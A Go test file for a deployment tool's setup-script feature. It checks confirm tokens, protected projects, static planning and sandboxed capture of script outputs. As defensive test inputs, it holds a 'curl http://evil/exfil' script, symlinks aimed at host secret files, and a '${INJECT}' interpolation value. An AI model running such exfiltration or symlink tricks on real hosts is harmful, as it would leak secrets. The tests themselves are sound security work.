package web

import (
	"context"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/daboss2003/Helmsman/internal/gitstore"
	"github.com/daboss2003/Helmsman/internal/sandbox"
)

func TestSetupSaveAndGet(t *testing.T) {
	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
	sess, csrf := e.authed(t)
	cookies := []*http.Cookie{sess, csrf}
	hdr := map[string]string{"Origin": "https://example.com"}

	f := url.Values{"script": {"#!/bin/sh\necho hi\n"}, "trigger": {"on_demand"}, "produces": {"env:TOKEN"}, "csrf_token": {csrf.Value}}
	resp := e.req(t, "POST", "/apps/shop/setup", "127.0.0.1:1", hdr, cookies, f)
	if resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("save = %d, want 303", resp.StatusCode)
	}
	ss, ok, _ := e.srv.setupStore.Get("shop")
	if !ok || ss.Trigger != "on_demand" || len(ss.Produces) != 1 {
		t.Fatalf("stored script wrong: %+v ok=%v", ss, ok)
	}
	// The GET page renders + reports disabled (default).
	body := readBody(e.req(t, "GET", "/apps/shop/setup", "127.0.0.1:1", nil, cookies, nil))
	if !strings.Contains(body, "Setup script") || !strings.Contains(strings.ToLower(body), "disabled") {
		t.Errorf("setup page missing/disabled-status: %.200s", body)
	}
}

// auto_deploy + an auto setup trigger is a hard reject (plan §7).
func TestSetupRejectsAutoWithAutoDeploy(t *testing.T) {
	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
	sess, csrf := e.authed(t)
	cookies := []*http.Cookie{sess, csrf}
	hdr := map[string]string{"Origin": "https://example.com"}
	// Configure a git app with auto_deploy on.
	if err := e.srv.gitStore.Save(context.Background(), gitstore.SaveInput{
		Project: "shop", RepoURL: "https://github.com/o/r.git", Ref: "refs/heads/main", BuildPolicy: "never", AutoDeploy: true,
	}); err != nil {
		t.Fatal(err)
	}
	f := url.Values{"script": {"echo hi"}, "trigger": {"on_first_deploy"}, "csrf_token": {csrf.Value}}
	resp := e.req(t, "POST", "/apps/shop/setup", "127.0.0.1:1", hdr, cookies, f)
	if resp.StatusCode != http.StatusUnprocessableEntity {
		t.Errorf("auto_deploy + on_first_deploy = %d, want 422", resp.StatusCode)
	}
}

func TestSetupSaveProtectedRejected(t *testing.T) {
	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
	e.srv.cfg.ProtectedProjects = []string{"edge"}
	sess, csrf := e.authed(t)
	cookies := []*http.Cookie{sess, csrf}
	hdr := map[string]string{"Origin": "https://example.com"}
	f := url.Values{"script": {"echo hi"}, "trigger": {"on_demand"}, "csrf_token": {csrf.Value}}
	resp := e.req(t, "POST", "/apps/edge/setup", "127.0.0.1:1", hdr, cookies, f)
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("protected setup save = %d, want 403", resp.StatusCode)
	}
}

// The static plan never executes; it returns advisory findings.
func TestSetupPlanIsStatic(t *testing.T) {
	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
	sess, csrf := e.authed(t)
	cookies := []*http.Cookie{sess, csrf}
	hdr := map[string]string{"Origin": "https://example.com"}
	f := url.Values{"script": {"curl http://evil/exfil\n"}, "csrf_token": {csrf.Value}}
	body := readBody(e.req(t, "POST", "/apps/shop/setup/plan", "127.0.0.1:1", hdr, cookies, f))
	if !strings.Contains(body, "no execution") || !strings.Contains(body, "network") {
		t.Errorf("plan output wrong: %q", body)
	}
}

// Run is refused when setup is disabled (the default).
func TestSetupRunRefusedWhenDisabled(t *testing.T) {
	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
	sess, csrf := e.authed(t)
	cookies := []*http.Cookie{sess, csrf}
	hdr := map[string]string{"Origin": "https://example.com"}
	// Save a script first.
	e.req(t, "POST", "/apps/shop/setup", "127.0.0.1:1", hdr, cookies,
		url.Values{"script": {"echo hi"}, "trigger": {"on_demand"}, "csrf_token": {csrf.Value}})

	resp := e.req(t, "POST", "/apps/shop/setup/run", "127.0.0.1:1", hdr, cookies, url.Values{"csrf_token": {csrf.Value}})
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("run while disabled = %d, want 403", resp.StatusCode)
	}
}

// Even when enabled, a run without a valid confirm token (bound to the checksum)
// is refused — the confirmation gate stands on its own.
func TestSetupRunRefusedWithoutConfirmToken(t *testing.T) {
	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
	e.srv.cfg.Setup.Enabled = true
	sess, csrf := e.authed(t)
	cookies := []*http.Cookie{sess, csrf}
	hdr := map[string]string{"Origin": "https://example.com"}
	e.req(t, "POST", "/apps/shop/setup", "127.0.0.1:1", hdr, cookies,
		url.Values{"script": {"echo hi"}, "trigger": {"on_demand"}, "csrf_token": {csrf.Value}})

	resp := e.req(t, "POST", "/apps/shop/setup/run", "127.0.0.1:1", hdr, cookies,
		url.Values{"confirm_token": {"bogus"}, "confirm_app_id": {"shop"}, "csrf_token": {csrf.Value}})
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("run with bogus confirm token = %d, want 403", resp.StatusCode)
	}
}

func TestConfirmStoreSingleUseBound(t *testing.T) {
	cs := newConfirmStore(time.Minute)
	tok := cs.mint("shop", "checksum-abc")
	// Wrong slug / wrong checksum never matches (and consumes).
	if cs.take(tok, "other", "checksum-abc") {
		t.Error("token matched the wrong slug")
	}
	if cs.take(tok, "shop", "checksum-abc") {
		t.Error("token survived a prior take (must be single-use)")
	}
	// Correct match, exactly once.
	tok2 := cs.mint("shop", "checksum-abc")
	if !cs.take(tok2, "shop", "checksum-abc") {
		t.Error("valid token rejected")
	}
	if cs.take(tok2, "shop", "checksum-abc") {
		t.Error("token reused")
	}
	// A changed checksum (script edit) voids a minted token.
	tok3 := cs.mint("shop", "checksum-abc")
	if cs.take(tok3, "shop", "checksum-XYZ") {
		t.Error("token matched a different checksum")
	}
}

// A hostile script that plants a SYMLINKED PARENT in scratch cannot exfiltrate a
// host file via a declared capture (canonicalize-then-confine).
func TestCaptureRejectsSymlinkedParent(t *testing.T) {
	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
	scratch := t.TempDir()
	secretDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(secretDir, "x"), []byte("HOSTSECRET"), 0o600); err != nil {
		t.Fatal(err)
	}
	// Inside the jail this is `ln -s <secretDir> /work/certs`.
	if err := os.Symlink(secretDir, filepath.Join(scratch, "certs")); err != nil {
		t.Skipf("symlink unsupported: %v", err)
	}
	ss := sandbox.ScriptSet{Script: "x", Trigger: "on_demand", Produces: []string{"file:certs/x"}}
	if _, err := e.srv.captureSetupOutputs(scratch, "shop", ss, "op"); err == nil {
		t.Fatal("capture through a symlinked parent must be rejected")
	}
	if _, statErr := os.Stat(filepath.Join(e.srv.appRunDir("shop"), "certs", "x")); statErr == nil {
		t.Error("exfiltrated host file was written into the run dir")
	}
}

// A symlinked .helmsman.env must not be followed (no host-file read via env capture).
func TestCaptureEnvRejectsSymlink(t *testing.T) {
	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
	scratch := t.TempDir()
	outside := filepath.Join(t.TempDir(), "secret.env")
	if err := os.WriteFile(outside, []byte("STOLEN=hostsecret\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(scratch, ".helmsman.env")); err != nil {
		t.Skipf("symlink unsupported: %v", err)
	}
	ss := sandbox.ScriptSet{Script: "x", Trigger: "on_demand", Produces: []string{"env:STOLEN"}}
	if _, err := e.srv.captureSetupOutputs(scratch, "shop", ss, "op"); err == nil {
		t.Error("symlinked env capture should be rejected")
	}
	if _, ok, _ := e.srv.envStore.Reveal("shop", "STOLEN"); ok {
		t.Error("host secret was captured via a symlinked env file")
	}
}

// Declared env captures are validated as hostile data; undeclared keys are ignored.
func TestCaptureEnvHostileDataAndDeclaredOnly(t *testing.T) {
	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
	scratch := t.TempDir()

	// A value with a ${...} interpolation sequence is rejected.
	if err := os.WriteFile(filepath.Join(scratch, ".helmsman.env"), []byte("BAD=x${INJECT}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	ssBad := sandbox.ScriptSet{Script: "x", Trigger: "on_demand", Produces: []string{"env:BAD"}}
	if _, err := e.srv.captureSetupOutputs(scratch, "shop", ssBad, "op"); err == nil {
		t.Error("hostile ${ env value should be rejected")
	}

	// A clean DECLARED key is captured as a secret; an undeclared key is ignored.
	if err := os.WriteFile(filepath.Join(scratch, ".helmsman.env"), []byte("TOKEN=abc123\nUNDECLARED=zzz\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	ssOK := sandbox.ScriptSet{Script: "x", Trigger: "on_demand", Produces: []string{"env:TOKEN"}}
	if _, err := e.srv.captureSetupOutputs(scratch, "shop", ssOK, "op"); err != nil {
		t.Fatalf("clean capture failed: %v", err)
	}
	if v, ok, _ := e.srv.envStore.Reveal("shop", "TOKEN"); !ok || v != "abc123" {
		t.Errorf("declared key not captured: %q ok=%v", v, ok)
	}
	if _, ok, _ := e.srv.envStore.Reveal("shop", "UNDECLARED"); ok {
		t.Error("undeclared key was captured")
	}
}

// On a non-Linux dev host the run fail-closes (sandbox unavailable) even past the
// confirm gate.
func TestSetupRunFailClosedOffLinux(t *testing.T) {
	if ok, _ := sandbox.Available(); ok {
		t.Skip("sandbox available (Linux)")
	}
	e := buildServer(t, []string{"127.0.0.1/32"}, false, nil, "")
	e.srv.cfg.Setup.Enabled = true
	sess, csrf := e.authed(t)
	cookies := []*http.Cookie{sess, csrf}
	hdr := map[string]string{"Origin": "https://example.com"}
	ss := sandbox.ScriptSet{Script: "echo hi", Trigger: "on_demand"}
	if err := e.srv.setupStore.Save(context.Background(), "shop", ss, false); err != nil {
		t.Fatal(err)
	}
	// Mint a valid confirm token bound to the real checksum.
	checksum := ss.Checksum(e.srv.setupLimits())
	tok := e.srv.setupConfirm.mint("shop", checksum)
	resp := e.req(t, "POST", "/apps/shop/setup/run", "127.0.0.1:1", hdr, cookies,
		url.Values{"confirm_token": {tok}, "confirm_app_id": {"shop"}, "csrf_token": {csrf.Value}})
	if resp.StatusCode != http.StatusServiceUnavailable {
		t.Errorf("run on non-Linux = %d, want 503 (fail-closed)", resp.StatusCode)
	}
}
